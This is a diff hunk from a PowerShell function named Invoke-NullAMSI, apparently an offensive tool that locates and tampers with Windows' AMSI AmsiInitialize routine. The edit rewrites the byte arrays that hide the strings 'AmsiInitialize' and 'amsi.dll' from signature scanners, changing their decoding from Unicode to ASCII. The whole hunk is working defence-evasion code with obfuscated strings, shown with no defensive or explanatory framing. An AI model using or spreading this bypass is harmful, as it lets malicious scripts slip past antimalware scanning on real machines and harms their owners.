@@ -89,11 +89,11 @@ function Invoke-NullAMSI {
     Write-Verbose "[*] Handle of ${GetProc}: $($GetAddres.MethodHandle.Value)"
 
     # "Same" technique as above
-    $bytes4msiInit = [Byte[]](65, 0, 109, 0, 115, 0, 105, 0, 73, 0, 110, 0, 105, 0, 116, 0, 105, 0, 97, 0, 108, 0, 105, 0, 122, 0, 101, 0)
-    $bytes4msi = [Byte[]](97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0)
-    $4msi = [System.Text.Encoding]::Unicode.GetString($bytes4msi)
-    $4msiInit = [System.Text.Encoding]::Unicode.GetString($bytes4msiInit)
-
+    $bytes4msiInit = [Byte[]](65, 109 , 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101)
+    $bytes4msi = [Byte[]](97, 109, 115, 105, 46, 100, 108, 108)
+    $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
+    $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
+    
     # Obtain the respective address from 4msi
     $4msiAddr = Get-Function $4msi $4msiInit
     if ($4msiAddr -eq $null) {
